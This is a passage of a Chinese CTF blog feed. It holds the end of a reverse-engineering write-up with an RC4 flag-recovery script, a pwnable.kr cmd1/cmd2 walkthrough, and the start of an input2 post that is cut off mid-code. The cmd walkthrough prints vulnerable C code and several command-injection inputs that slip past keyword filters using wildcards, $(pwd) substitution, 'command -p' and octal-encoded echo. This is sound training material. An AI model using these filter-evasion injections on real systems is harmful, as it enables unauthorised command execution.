class="line">rc4 = ARC4.new(key)</span><br><span class="line">rc4_plain = rc4.decrypt(rc4_cipher)</span><br><span class="line">print(rc4_plain)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½è¿ç®—</span></span><br><span class="line">big_num_hex = binascii.hexlify(rc4_plain)</span><br><span class="line">big_num_bin = bin(int(big_num_hex, <span class="number">16</span>))[<span class="number">2</span>:].rjust(<span class="number">16</span>*<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">big_num_bin = big_num_bin[<span class="number">3</span>:] + big_num_bin[:<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    flag += hex(int(big_num_bin[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 653b987431e5a2fc7c3d748fba008869</span></span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205005157181.png"></p><h3 id="å¤ç°æ€»ç»“"><a href="#å¤ç°æ€»ç»“" class="headerlink" title="å¤ç°æ€»ç»“"></a>å¤ç°æ€»ç»“</h3><ol><li>å¸¸è§çš„åŠ å¯†ç®—æ³•ç‰¹å¾ä¸æ¸…æ¥šï¼ˆå¤§é—®é¢˜ï¼‰</li><li>çœ‹æ±‡ç¼–ä¸ä»”ç»†ï¼ˆéœ€è¦æ”¹æ‰è‡ªå·±ç²—å¿ƒçš„æ¯›ç—…ï¼‰</li><li>windowsæ–¹é¢çŸ¥è¯†è¿˜æ˜¯ä¸å¤Ÿ</li><li>é¢˜å‹è§å¾—å¤ªå°‘äº†ï¼Œæ„Ÿè§‰åšäº†ä¸€é“é¢˜å°±ç´¯çš„è¦æ­»ğŸ˜‘ï¼ŒçœŸçš„ä½©æœæ¯”èµ›ä»å¼€å§‹è‚åˆ°æœ€åçš„å¸ˆå‚…ä»¬</li><li>å­¦ä¹ äº†æ€ä¹ˆä½¿ç”¨Cryptdomeåº“ï¼Œwindowsçš„å‡ ç§åè°ƒè¯•ï¼ˆå¼‚å¸¸æ³¨å†Œï¼Œdebug bloker)ï¼Œä¸‹æ¬¡åœ¨é‡åˆ°å°±ä¸ä¼šè¿™ä¹ˆç—›è‹¦äº†å§ï¼ˆå¤§æ¦‚ï¼‰</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;babyre&quot;&gt;&lt;a href=&quot;#babyre&quot; class=&quot;headerlink&quot; title=&quot;babyre&quot;&gt;&lt;/a&gt;babyre&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://f1sh-blog.oss-cn-</summary>
      
    
    
    
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr cmd1 cmd2</title>
    <link href="http://example.com/2021/01/31/CTF/pwn/pwnable/pwnable.kr%20cmd1%20cmd2/"/>
    <id>http://example.com/2021/01/31/CTF/pwn/pwnable/pwnable.kr%20cmd1%20cmd2/</id>
    <published>2021-01-31T08:35:25.563Z</published>
    <updated>2021-02-05T06:33:30.279Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h3><p><a href="http://c.biancheng.net/view/5876.html">linuxPATHå…¥é—¨æ•™å­¦</a><br><a href="https://blog.csdn.net/qq_16334327/article/details/96591949">linuxå‘½ä»¤é€šé…ç¬¦</a><br><a href="https://blog.csdn.net/shisiye15/article/details/7846557">putenvå‡½æ•°è®²è§£</a></p><p>è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯å¯¹äºlinuxä¸­shellçš„æ“ä½œï¼Œè¿˜æœ‰PATHç¯å¢ƒçŸ¥è¯†çš„ç†è§£ã€‚æˆ‘å‚è€ƒäº†ä¸Šé¢ä¸‰ç¯‡æ–‡ç« ï¼Œéƒ½å†™å¾—å¾ˆä¸é”™ğŸ‘ã€‚è¿™é‡Œæˆ‘å†™ä¸¤ç§è§£å†³æ–¹æ³•</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201203616211.png"></p><h4 id="method-1"><a href="#method-1" class="headerlink" title="method 1"></a>method 1</h4><p>é¦–å…ˆsshç™»å½•ï¼ŒæŸ¥çœ‹æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;sh&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;tmp&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">        putenv(<span class="string">&quot;PATH=/thankyouverymuch&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">        system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        system( argv[<span class="number">1</span>] );</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºå°†PATHç¯å¢ƒè®¾ç½®æˆäº†ä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„å¯¼è‡´ä¸èƒ½ç›´æ¥ä½¿ç”¨å‘½ä»¤ï¼Œè€Œä¸”filterå‡½æ•°è¿‡æ»¤æ‰äº†æˆ‘ä»¬è¾“å…¥çš„ä¸€äº›å­—ç¬¦ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥å…ˆæ¥æµ‹è¯•ä¸€ä¸‹PATHå¦‚æœè¢«æ”¹å˜ä¼šæ€ä¹ˆæ ·ï¼Œä¸‹é¢è´´æµ‹è¯•ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//æ‰“å°æ”¹å˜å‰çš„PATHï¼Œå¹¶ä¸”ä½¿ç”¨å‘½ä»¤</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;before PATH: %s\n&quot;</span>,getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">        system(argv[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//æ”¹å˜PATHï¼Œå°†å…¶è®¾ç½®æˆä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„</span></span><br><span class="line">        putenv(<span class="string">&quot;PATH=/aaa&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//å†æ¬¡æ‰“å°è·¯å¾„</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;after PATH: %s\n&quot;</span>, getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">        system(argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘åè¿è¡Œï¼Œè¿™é‡Œæˆ‘ä»¬æµ‹è¯•çš„å‘½ä»¤æ˜¯ <strong>ls</strong> ï¼Œå¯ä»¥å‘ç°lså‘½ä»¤å·²ç»å¤±æ•ˆäº†ï¼Œç”±äºPATHçš„è·¯å¾„è¢«ä¸´æ—¶æ”¹å˜ï¼Œéœ€è¦ä½¿ç”¨lså‘½ä»¤çš„ç»å¯¹è·¯å¾„ <strong>/bin/ls</strong></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201204940643.png"></p><p>å†æ¬¡æµ‹è¯•ï¼Œä½¿ç”¨å‘½ä»¤çš„ç»å¯¹è·¯å¾„ <strong>/bin/ls</strong>ï¼Œå¯ä»¥å‘ç°åˆå¯ä»¥æ­£å¸¸è¿è¡Œäº†</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201205043930.png" alt="image-20210201205043930"></p><p>æ‰€ä»¥è¿™é“é¢˜æˆ‘ä»¬éœ€è¦è¾“å…¥<strong>cat</strong>å‘½ä»¤çš„ç»å¯¹è·¯å¾„ <strong>/bin/cat</strong>ï¼Œä½†æ˜¯é—®é¢˜åˆæ¥äº†ï¼Œflagè¿™ä¸ªè¯è¢«è¿‡æ»¤æ‰äº†ï¼Œè¿™å°±éœ€è¦ä½¿ç”¨åˆ°ç»Ÿé…ç¬¦äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <strong>â€œ/bin/cat f*â€œ</strong> æˆ–è€… <strong>â€œ/bin/cat fla?â€</strong> ç­‰å‘½ä»¤æ¥å®ç°æŸ¥çœ‹flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cmd1 &#x27;/bin/cat fla?&#x27;</span><br><span class="line">./cmd1 &#x27;/bin/cat f*&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201205526147.png"></p><p><em>mommy now I get what PATH environment is for :)</em></p><h4 id="method-2"><a href="#method-2" class="headerlink" title="method 2"></a>method 2</h4><p>ç¬¬äºŒç§æ–¹æ³•æ˜¯æˆ‘ä»¬é‡‡ç”¨shellç¼–ç¨‹æ–¹å¼ï¼Œå…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œåœ¨åˆ©ç”¨ç¨‹åºæ‰“å¼€æˆ‘ä»¬çš„æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»»æ„å­—ç¬¦è€Œä¸å—é™åˆ¶</p><ul><li><p>é¦–å…ˆç°åœ¨æœåŠ¡å™¨çš„/tmp/ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæˆ‘ä»¬è‡ªå·±ä½¿ç”¨çš„ç›®å½•ï¼Œç„¶ååœ¨ç›®å½•ä¸­åˆ›å»ºæˆ‘ä»¬çš„æ–‡ä»¶ï¼Œä¸€ä¼šå„¿éœ€è¦ç”¨ç¨‹åºæ¥è°ƒç”¨</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201210815614.png"></p></li><li><p>åœ¨åˆ›å»ºbashæ–‡ä»¶ï¼Œæ–‡ä»¶åå­—é‡Œé¢åƒä¸‡ä¸èƒ½å¸¦æœ‰è¿‡æ»¤å­—ç¬¦ï¼ˆæˆ‘è¸©äº†è¿™ä¸ªå‘ğŸ˜¥ï¼‰ï¼Œç„¶åå†™å…¥å‘½ä»¤</p></li></ul><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201212309793.png"></p><ul><li>è®©ç¨‹åºè°ƒç”¨æ–‡ä»¶ï¼Œä¸€æ ·å¯ä»¥è¾¾åˆ°æ•ˆæœ</li></ul><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201212435273.png"></p><h3 id="cmd2"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</h3><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201212556897.png"></p><p>cmd2çš„è€ƒç‚¹ä¸cmd1å¤§åŒå°å¼‚ï¼Œåªæ˜¯è¿™ä¸€æ¬¡æºç ä¸­è¿‡æ»¤äº†æ›´å¤šçš„å­—ç¬¦ï¼Œéœ€è¦æ›´é«˜çš„æŠ€å·§æ‰èƒ½ç»•è¿‡å­—ç¬¦è¿‡æ»¤æ£€æµ‹æ‹¿åˆ°flagï¼Œä¸‹é¢è´´æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;=&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;PATH&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;export&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;/&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;`&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span>** p;</span><br><span class="line">        <span class="keyword">for</span>(p=environ; *p; p++) <span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">        delete_env();</span><br><span class="line">        putenv(<span class="string">&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        system( argv[<span class="number">1</span>] );</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™æ¬¡ç¨‹åºç›´æ¥è¿‡æ»¤äº†â€™/â€˜,â€™.â€™ä¹‹ç±»çš„ç¬¦å·ï¼Œè¿è·¯å¾„éƒ½ä¸è®©ä½¿ç”¨ğŸ’” ä¸‹é¢æˆ‘æä¾›å‡ ç§ç§æ–¹æ³•ï¼ˆç½‘ä¸Šçœ‹åˆ°æ€»ç»“çš„ï¼Œå­¦ä¹ ä¸€æ‰‹ï¼‰</p><h4 id="åˆ©ç”¨pwd"><a href="#åˆ©ç”¨pwd" class="headerlink" title="åˆ©ç”¨pwd"></a>åˆ©ç”¨pwd</h4><p>åˆ©ç”¨$ï¼Œæˆ‘ä»¬å¯ä»¥è¿›å…¥åˆ°æ ¹ç›®å½•ï¼Œç”¨$(pwd)æ¥ä»£æ›¿â€™/â€˜</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202002742365.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">/home/cmd2/cmd2 &#x27;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*&#x27;</span><br><span class="line">/home/cmd2/cmd2 &quot;\$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)f*&quot;</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202001835043.png"></p><p>ä¸Šé¢ä¸¤ç§å†™æ³•éƒ½å¯ä»¥ï¼Œè¿™æ˜¯linuxä¸­åŒå¼•å·å’Œå•å¼•å·çš„åŒºåˆ«ï¼Œä¸‹é¢è¿™ç¯‡æ–‡ç« å¯ä»¥äº†è§£ä»–ä»¬ä¹‹é—´çš„åŒºåˆ«</p><p><a href="https://blog.csdn.net/u014636245/article/details/82919144">Linuxä¸­å•å¼•å·åŒå¼•å·çš„åŒºåˆ«ä¸ç”¨æ³•</a></p><h4 id="command-p"><a href="#command-p" class="headerlink" title="command -p"></a>command -p</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;command -p&#x27; //è¿™æ¡å‘½ä»¤ä¼šå¼ºåˆ¶å°†ç¯å¢ƒå˜ä¸ºé»˜è®¤å€¼ï¼Œå°±ä¸ç”¨ä½¿ç”¨ç»å¯¹è·¯å¾„</span><br><span class="line">./cmd2 &#x27;command -p cat f*&#x27;</span><br></pre></td></tr></table></figure><h4 id="echoè§£æ8è¿›åˆ¶ä¸16è¿›åˆ¶"><a href="#echoè§£æ8è¿›åˆ¶ä¸16è¿›åˆ¶" class="headerlink" title="echoè§£æ8è¿›åˆ¶ä¸16è¿›åˆ¶"></a>echoè§£æ8è¿›åˆ¶ä¸16è¿›åˆ¶</h4><p>åœ¨ç½‘ä¸Šçœ‹åˆ«äººwpå­¦çš„å…¶å®æˆ‘è§‰å¾—åŸç†å’Œç¬¬ä¸€ä¸ªå·®ä¸å¤ªå¤šï¼Œè¿™ä¸ªæ˜¯åˆ©ç”¨echoå¯ä»¥è§£æ16è¿›åˆ¶å’Œ8è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸²ï¼ˆä½†æ˜¯ä¸èƒ½ç”¨å‚æ•° -eï¼‰ï¼Œå…·ä½“æƒ…å†µè¦çœ‹ç³»ç»Ÿç‰ˆæœ¬ã€‚ï¼ˆæˆ‘åœ¨ç½‘ä¸Šçœ‹åˆ°ä»–ä»¬åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šechoå‘½ä»¤å¯ä»¥è§£é‡Š8è¿›åˆ¶ï¼Œä½†æˆ‘è¯•äº†è¯•å°±ä¸è¡Œï¼Œè¿˜æ˜¯è®°å½•ä¸‹è¿™ä¸ªæ–¹æ³•ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°† /bin/cat flag è½¬åŒ–ä¸º8è¿›åˆ¶</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cmd = <span class="string">&quot;/bin/cat flag&quot;</span></span><br><span class="line">print(<span class="string">&quot;\\&quot;</span>+<span class="string">&quot;\\&quot;</span>.join([oct(i) <span class="keyword">for</span> i <span class="keyword">in</span> ordlist(cmd)]))</span><br><span class="line"><span class="comment"># \057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cmd2 &#x27;$(echo &quot;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>æˆ‘çš„æœ¬åœ°è™šæ‹Ÿæœºå°±ä¸å¯ä»¥ç›´æ¥ç”¨echoå‘½ä»¤è½¬ï¼Œéœ€è¦å‚æ•°-e</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202000852202.png"></p><h4 id="set-s"><a href="#set-s" class="headerlink" title="set -s"></a>set -s</h4><p>å…·ä½“çš„åŸç†è¿˜æ²¡æœ‰åœ¨ç½‘ä¸Šæ‰¾åˆ°ï¼Œç­‰åé¢è¡¥å……</p><p><a href="http://www.ruanyifeng.com/blog/2017/11/bash-set.html">Bash è„šæœ¬ set å‘½ä»¤æ•™ç¨‹</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cmd2 &#x27;set -s&#x27;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">/bin/cat flag</span></span><br></pre></td></tr></table></figure><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ol><li><p>shellç¼–ç¨‹ç‚¹éƒ½ä¸ä¼šï¼Œå…¶å®ä¸Šå­¦æœŸå­¦äº†çš„ï¼Œåªæ˜¯ä¸Šç½‘è¯¾ä¸€ç‚¹éƒ½æ²¡æœ‰è®¤çœŸå¬ã€‚ã€‚æƒ³åœ¨æƒ³èµ·æ¥æœ‰ç‚¹å‚»ï¼Œåé¢éœ€è¦è¡¥ä¹ ä¸‹shellçš„çŸ¥è¯†</p></li><li><p>linuxçš„ä¸œè¥¿å¤ªçµæ´»äº†ã€‚ã€‚å…¶å®ä¸Šé¢çš„ä¸¤é“é¢˜è¿˜æœ‰å‡ ç§å…¶ä»–çš„æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ç²¾åŠ›å’Œæ—¶é—´æœ‰é™ï¼Œåªæ”¶é›†äº†å‡ ç§æˆ‘æ„Ÿè§‰è¿˜å¯ä»¥çš„æ–¹æ³•</p></li><li><p>æˆ‘å¤ªèœäº†ã€‚ã€‚ğŸ¹</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;cmd1&quot;&gt;&lt;a href=&quot;#cmd1&quot; class=&quot;headerlink&quot; title=&quot;cmd1&quot;&gt;&lt;/a&gt;cmd1&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://c.biancheng.net/view/5876.h</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr input2</title>
    <link href="http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-input2/"/>
    <id>http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-input2/</id>
    <published>2021-01-30T15:55:25.870Z</published>
    <updated>2021-02-08T05:15:37.744Z</updated>
    
    <content type="html"><![CDATA[<h4 id="readå‡½æ•°"><a href="#readå‡½æ•°" class="headerlink" title="readå‡½æ•°"></a>readå‡½æ•°</h4><p>ä»æ–‡ä»¶æè¿°ç¬¦æŒ‡å‘çš„ç®¡é“å£è¯»å…¥æŒ‡å®šå­—èŠ‚çš„å­—ç¬¦ä¸²åˆ°æŒ‡å®šçš„æ•°ç»„ä¸­</p><h4 id="writeå‡½æ•°"><a href="#writeå‡½æ•°" class="headerlink" title="writeå‡½æ•°"></a>writeå‡½æ•°</h4><p>ä»æŒ‡å®šçš„æ•°ç»„ä¸­å†™å…¥æŒ‡å®šæ•°é‡çš„å­—èŠ‚åˆ°æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦æŒ‡å‘çš„ç®¡é“å£</p><p>å¸¸è§çš„ ä¸‰ç§ 0ï¼Œ 1ï¼Œ 2 åˆ†åˆ«è¡¨ç¤ºæ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†é”™è¯¯</p><h4 id="pipeå‡½æ•°"><a href="#pipeå‡½æ•°" class="headerlink" title="pipeå‡½æ•°"></a>pipeå‡½æ•°</h4><h4 id="dup-amp-dup2å‡½æ•°"><a href="#dup-amp-dup2å‡½æ•°" class="headerlink" title="dup&amp;dup2å‡½æ•°"></a>dup&amp;dup2å‡½æ•°</h4><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/20170503111155611.jpg"></p><p>å¤åˆ¶ä¸€ä»½ç›¸åŒçš„æ–‡ä»¶æè¿°ç¬¦</p><h4 id="forkå‡½æ•°"><a href="#forkå‡½æ•°" class="headerlink" title="forkå‡½æ•°"></a>forkå‡½æ•°</h4><p>åœ¨å½“å‰çˆ¶è¿›ç¨‹åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹è¿”å›å¾—fpid == 0</p><h4 id="æ–‡ä»¶æè¿°ç¬¦"><a href="#æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="æ–‡ä»¶æè¿°ç¬¦"></a>æ–‡ä»¶æè¿°ç¬¦</h4><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210124163916045.png"></p><h4 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> buffer2[<span class="number">100</span>];</span><br><span class="line">        <span class="keyword">char</span> buffer[] = <span 